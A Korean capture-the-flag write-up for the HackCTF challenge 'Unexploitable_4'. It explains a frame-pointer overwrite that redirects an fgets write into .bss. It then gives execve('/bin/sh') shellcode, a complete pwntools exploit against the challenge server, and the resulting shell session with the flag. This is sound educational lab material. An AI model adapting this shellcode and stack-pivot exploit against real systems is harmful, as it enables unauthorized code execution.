#Unexploitable_4

---

우선 `main()`의 코드는 다음과 같다.

<pre>
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s; // [rsp+0h] [rbp-10h]

  sub_40066D(a1, a2, a3);
  fgets(&s, 44, stdin);
  return 0LL;
}
</pre>

`main()`이외에 다른 함수들을 살펴보았지만 출력을 할 수 있는 함수가 전혀 없어서 leak이 불가능한 상황이다.

하지만 보호기법을 보니 다음과 같이 shellcode를 사용할 수 있음을 알 수 있었다.

<pre>
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</pre>

`main()`의 assembly 코드는 다음과 같기 때문에  rbp의 값을 조절한 후 0x4006db로 ret시켜서 원하는 곳에 44bytes만큼 쓸 수 있다.

<pre>
push    rbp
.text:00000000004006CF                 mov     rbp, rsp
.text:00000000004006D2                 sub     rsp, 10h
.text:00000000004006D6                 call    sub_40066D
.text:00000000004006DB                 mov     rdx, cs:stdin   ; stream
.text:00000000004006E2                 lea     rax, [rbp+s]
.text:00000000004006E6                 mov     esi, 2Ch ; ','  ; n
.text:00000000004006EB                 mov     rdi, rax        ; s
.text:00000000004006EE                 call    _fgets
.text:00000000004006F3                 mov     eax, 0
.text:00000000004006F8                 leave
.text:00000000004006F9                 retn
</pre>

44bytes의 길이는 [dummy 16bytes]+[SFP 8bytes]+[ret 8bytes]+[dummy 12bytes]로 이루어져 있기 때문에 SFP부분에 원하는 값을 넣고 ret주소를 조작한다고 하면 24bytes이내에 원하는 값을 쓸 수 있기 때문에 24bytes 이하의 shellcode를 쓸 수 있다.

하지만 그 24bytes짜리 shellcode를 수행하던 중에 push 명령어를 일정 개수 이상 수행하게 되면 rsp가 rip의 영역을 침범하여 shellcode가 덮어씌워진다. 이 부분이 이 문제의 핵심포인트이다.

---

때문에 최대한 push를 쓰지 않으려고 하였다. 나는 다음과 같은 shellcode를 썼다.

**\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05**

<pre>
0:  48 31 f6                xor    rsi,rsi
3:  48 31 d2                xor    rdx,rdx
6:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
d:  73 68 00
10: 53                      push   rbx
11: 48 89 e7                mov    rdi,rsp
14: b0 3b                   mov    al,0x3b
16: 0f 05                   syscall
</pre>

해당 shellcode는 18bytes로 한 번의 `fgets()`를 사용하여 입력할 수 있다.

원래는 push rax push rbx를 통해서 "/bin//sh"끝에 0을 위치시켜 문자열의 끝을 나타내지만 push를 없애기 위해서 "/bin/sh\x00"을 rbx에 넣어 push rbx시켰다.

익스플로잇 코드는 다음과 같다.

<pre>
from pwn import*

#p=process('./Unexploitable_4')
#gdb.attach(p)
p=remote('ctf.j0n9hyun.xyz',3039)

main_fgets=0x4006db
bss=0x601900

payload='A'*16
payload+=p64(bss+0x10)
payload+=p64(main_fgets)

p.sendline(payload)

###

payload2='\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
payload2+=p64(bss)

p.sendline(payload2)

p.interactive()
</pre>

flag는 다음과 같다.

<pre>
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/40.Unexploitable_4$ python ex2.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3039: Done
[*] Switching to interactive mode
$ cat flag
HackCTF{C4n_Y0u_Exp1oit???!}

</pre>

**flag: HackCTF{C4n\_Y0u\_Exp1oit???!}**
